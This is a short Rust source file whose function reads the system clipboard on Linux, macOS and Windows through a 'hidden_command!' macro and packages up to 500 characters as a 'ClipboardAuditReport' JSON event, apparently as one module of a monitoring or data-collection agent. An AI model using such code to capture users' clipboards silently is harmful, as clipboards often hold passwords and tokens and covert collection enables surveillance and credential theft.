use serde_json::json;

pub fn audit_clipboard() -> serde_json::Value {
    let mut contents = "No active display or xclip missing".to_string();

    #[cfg(target_os = "linux")]
    {
        if let Ok(output) = crate::hidden_command!("xclip")
            .env("DISPLAY", ":0")
            .args(&["-o", "-selection", "clipboard"])
            .output()
        {
            if output.status.success() {
                contents = String::from_utf8_lossy(&output.stdout).trim().to_string();
                if contents.is_empty() {
                    contents = "[Clipboard is empty]".to_string();
                }
            }
        }
    }

    #[cfg(target_os = "macos")]
    {
        if let Ok(output) = crate::hidden_command!("pbpaste").output() {
            if output.status.success() {
                contents = String::from_utf8_lossy(&output.stdout).trim().to_string();
                if contents.is_empty() {
                    contents = "[Clipboard is empty]".to_string();
                }
            }
        }
    }

    #[cfg(target_os = "windows")]
    {
        if let Ok(output) = crate::hidden_command!("powershell")
            .args(&["-NoProfile", "-Command", "Get-Clipboard"])
            .output()
        {
            if output.status.success() {
                contents = String::from_utf8_lossy(&output.stdout).trim().to_string();
                if contents.is_empty() {
                    contents = "[Clipboard is empty]".to_string();
                }
            }
        }
    }

    // Limit clipboard size to avoid massive payloads
    let truncated: String = contents.chars().take(500).collect();

    json!({
        "EventType": "ClipboardAuditReport",
        "ClipboardContents": truncated
    })
}
